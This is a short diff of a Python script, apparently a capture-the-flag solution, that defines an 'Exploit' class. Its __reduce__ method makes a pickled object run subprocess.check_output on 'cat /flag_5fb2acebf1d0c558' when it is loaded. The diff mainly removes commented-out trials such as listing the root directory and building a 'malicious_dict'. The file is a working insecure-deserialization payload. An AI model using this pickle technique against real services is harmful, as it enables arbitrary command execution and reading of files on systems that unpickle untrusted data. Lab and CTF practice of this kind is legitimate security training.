@@ -8,20 +8,8 @@ def read(cmd):
     return subprocess.check_output(cmd).decode()
 
 class Exploit:
-    # def meow(self):
-    #     cmd = ['ls', '/']
-    #     cmd_output = subprocess.check_output(cmd).decode()
-    #     return [{"name": cmd_output, "age": 0}]
     def __reduce__(self):
-        # The command to list the contents of the root directory
         cmd = ['cat', '/flag_5fb2acebf1d0c558']
-        # cmd_output = subprocess.check_output
-
-        # Construct the dictionary that our exploit will return
-        # malicious_dict = {
-        #     'name': cmd_output,
-        #     'age': 0
-        # }
 
         return (subprocess.check_output, (cmd, ))
 
